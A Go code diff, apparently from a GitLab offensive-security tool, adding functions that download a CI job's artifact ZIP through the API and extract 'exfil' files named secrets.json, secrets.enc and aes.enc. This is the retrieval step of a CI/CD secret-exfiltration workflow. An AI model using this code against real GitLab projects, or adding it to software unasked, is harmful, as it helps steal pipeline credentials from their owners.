@@ -220,3 +220,61 @@ func ScrapeArtifacts(ctx context.Context, client *gitlabx.Client, projectID any,
 	}
 	return findings, nil
 }
+
+// DownloadJobArtifactsZIP downloads the artifact ZIP for a specific job.
+// Endpoint: GET /api/v4/projects/:id/jobs/:job_id/artifacts
+func DownloadJobArtifactsZIP(ctx context.Context, client *gitlabx.Client, projectID any, jobID int64) ([]byte, error) {
+	if client == nil {
+		return nil, fmt.Errorf("nil client")
+	}
+	pidEsc := url.PathEscape(fmt.Sprintf("%v", projectID))
+	artURL := client.APIURL(fmt.Sprintf("/api/v4/projects/%s/jobs/%d/artifacts", pidEsc, jobID))
+	req, err := http.NewRequestWithContext(ctx, http.MethodGet, artURL, nil)
+	if err != nil {
+		return nil, err
+	}
+	if tok := client.Token(); tok != "" {
+		req.Header.Set("PRIVATE-TOKEN", tok)
+	}
+	req.Header.Set("Accept", "application/zip")
+	resp, err := client.HTTPClient().Do(req) //nolint:gosec
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		return nil, fmt.Errorf("download artifacts: http %d", resp.StatusCode)
+	}
+	const maxZIP = 100 * 1024 * 1024 // 100 MiB
+	return io.ReadAll(io.LimitReader(resp.Body, maxZIP))
+}
+
+// ExtractExfilFiles extracts secrets.json, secrets.enc, and aes.enc from an artifact ZIP.
+// Returns nil slices for files that are absent or empty.
+func ExtractExfilFiles(zipData []byte) (secretsJSON, secretsEnc, aesEnc []byte, err error) {
+	r, zerr := zip.NewReader(bytes.NewReader(zipData), int64(len(zipData)))
+	if zerr != nil {
+		return nil, nil, nil, fmt.Errorf("open zip: %w", zerr)
+	}
+	extract := func(name string) ([]byte, error) {
+		for _, f := range r.File {
+			if filepath.Base(f.Name) == name {
+				rc, rerr := f.Open()
+				if rerr != nil {
+					return nil, rerr
+				}
+				defer rc.Close()
+				return io.ReadAll(rc)
+			}
+		}
+		return nil, nil
+	}
+	if secretsJSON, err = extract("secrets.json"); err != nil {
+		return
+	}
+	if secretsEnc, err = extract("secrets.enc"); err != nil {
+		return
+	}
+	aesEnc, err = extract("aes.enc")
+	return
+}
